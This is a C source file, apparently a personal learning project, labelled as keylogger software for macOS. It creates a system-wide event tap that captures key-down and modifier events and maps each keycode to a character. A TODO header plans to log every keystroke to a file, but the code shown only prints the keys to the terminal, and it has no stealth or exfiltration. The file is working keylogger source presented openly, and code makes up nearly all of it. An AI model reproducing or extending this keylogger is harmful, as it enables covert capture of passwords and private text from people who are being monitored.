/*  Kristians Kanders
*   Keylogger software for Mac OS 
*
*   TODO:
*     - Implement a script that prints out a simple input to the terminal
*     - Change script to log that key to a file
*     - Finalize project that reads all keystrokes
*/

#include <stdio.h>
#include <string.h>
#include <Carbon/Carbon.h>
#include <ApplicationServices/ApplicationServices.h>

CGEventRef myEventCallBack(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon);
char* translateKeyCode(int keyCode);

int main(void){

  // Let's setup an event mask, this is necessary for us to be able to register specific events using apple's provided API
  CGEventMask keypressInputMask = (CGEventMaskBit(kCGEventKeyDown)| CGEventMaskBit(kCGEventFlagsChanged));
  // kCGEventDown is how a key press event is classified and this is how we can check what key is pressed
  // kCGEventFlagsChanged is what let's us know that a different key is pressed
  
  // now let's set up an event tap
  // event taps are what let us monitor events throughout the operating system (these have some limitations that I discuss in the README)
  CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, keypressInputMask, myEventCallBack, NULL);

  // if we don't have the right permissions, we will not be able to create an event tap, so let's check if this worked before moving on
  if (!eventTap) {
        printf("failed to create event tap\n");
        exit(1);
    }

  printf("Let's go!\n");

  // now let's make this a continuously running application by setting up some looping
  CFRunLoopSourceRef runLoop = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);

  // shove this newly created loop into the MacOS loop 
  CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoop, kCFRunLoopCommonModes);

  // with an established loop let's start our event tap
  CGEventTapEnable(eventTap, true);

  // send out program free to cause all sorts of havoc
  CFRunLoopRun();

  return 0;
}

CGEventRef myEventCallBack(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon){

  // check if we have received a valid event (relevant to a keylogger)
  if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp){
    return event;
  }

  // all keys have special keycodes, so let's see what the keycode is
  CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

  printf("Got key: %s\n", translateKeyCode(keyCode));
  return event;
}

// keycodes on macOS seem rather inconsistent. Events.h at the root of the system go a little more indepth on these
char* translateKeyCode(int keyCode) {
    switch ((int) keyCode) {
        case 0:   return "a";
        case 1:   return "s";
        case 2:   return "d";
        case 3:   return "f";
        case 4:   return "h";
        case 5:   return "g";
        case 6:   return "z";
        case 7:   return "x";
        case 8:   return "c";
        case 9:   return "v";
        case 11:  return "b";
        case 12:  return "q";
        case 13:  return "w";
        case 14:  return "e";
        case 15:  return "r";
        case 16:  return "y";
        case 17:  return "t";
        case 18:  return "1";
        case 19:  return "2";
        case 20:  return "3";
        case 21:  return "4";
        case 22:  return "6";
        case 23:  return "5";
        case 24:  return "=";
        case 25:  return "9";
        case 26:  return "7";
        case 27:  return "-";
        case 28:  return "8";
        case 29:  return "0";
        case 30:  return "]";
        case 31:  return "o";
        case 32:  return "u";
        case 33:  return "[";
        case 34:  return "i";
        case 35:  return "p";
        case 37:  return "l";
        case 38:  return "j";
        case 39:  return "'";
        case 40:  return "k";
        case 41:  return ";";
        case 42:  return "\\";
        case 43:  return ",";
        case 44:  return "/";
        case 45:  return "n";
        case 46:  return "m";
        case 47:  return ".";
        case 50:  return "`";
        case 65:  return "[decimal]";
        case 67:  return "[asterisk]";
        case 69:  return "[plus]";
        case 71:  return "[clear]";
        case 75:  return "[divide]";
        case 76:  return "[enter]";
        case 78:  return "[hyphen]";
        case 81:  return "[equals]";
        case 82:  return "0";
        case 83:  return "1";
        case 84:  return "2";
        case 85:  return "3";
        case 86:  return "4";
        case 87:  return "5";
        case 88:  return "6";
        case 89:  return "7";
        case 91:  return "8";
        case 92:  return "9";
        case 36:  return "[return]";
        case 48:  return "[tab]";
        case 49:  return " ";
        case 51:  return "[del]";
        case 53:  return "[esc]";
        case 54:  return "[right-cmd]";
        case 55:  return "[left-cmd]";
        case 56:  return "[left-shift]";
        case 57:  return "[caps]";
        case 58:  return "[left-option]";
        case 59:  return "[left-ctrl]";
        case 60:  return "[right-shift]";
        case 61:  return "[right-option]";
        case 62:  return "[right-ctrl]";
        case 63:  return "[fn]";
        case 64:  return "[f17]";
        case 72:  return "[volup]";
        case 73:  return "[voldown]";
        case 74:  return "[mute]";
        case 79:  return "[f18]";
        case 80:  return "[f19]";
        case 90:  return "[f20]";
        case 96:  return "[f5]";
        case 97:  return "[f6]";
        case 98:  return "[f7]";
        case 99:  return "[f3]";
        case 100: return "[f8]";
        case 101: return "[f9]";
        case 103: return "[f11]";
        case 105: return "[f13]";
        case 106: return "[f16]";
        case 107: return "[f14]";
        case 109: return "[f10]";
        case 111: return "[f12]";
        case 113: return "[f15]";
        case 114: return "[help]";
        case 115: return "[home]";
        case 116: return "[pgup]";
        case 117: return "[fwddel]";
        case 118: return "[f4]";
        case 119: return "[end]";
        case 120: return "[f2]";
        case 121: return "[pgdown]";
        case 122: return "[f1]";
        case 123: return "[left]";
        case 124: return "[right]";
        case 125: return "[down]";
        case 126: return "[up]";
    }
    return "[unknown]";
}